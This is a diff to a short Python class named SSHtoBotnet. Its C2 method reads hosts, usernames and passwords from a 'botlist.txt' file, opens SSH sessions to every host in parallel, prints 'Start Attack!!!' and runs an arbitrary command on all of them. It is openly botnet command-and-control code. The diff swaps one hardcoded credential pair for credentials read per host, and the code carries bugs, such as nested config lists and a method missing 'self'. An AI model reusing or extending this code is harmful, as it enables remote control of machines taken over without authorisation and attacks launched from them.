@@ -1,18 +1,17 @@
 from pssh.clients import ParallelSSHClient
 from pssh.config import HostConfig
-import argparse
 
 class SSHtoBotnet:
     def C2(command):
         hosts = []
+        config = []
         for client in open('botlist.txt','r').readlines():
             result = client.split("$")
             hosts.append(result[0])
-        config = [HostConfig(user='bach', password='2349567')]
+            config.append([HostConfig(user=result[1], password=result[2])])
 
         client = ParallelSSHClient(hosts,host_config=config)
 
-
         print("Start Attack!!!")
-        output = client.run_command(command)
+        client.run_command(command)
 
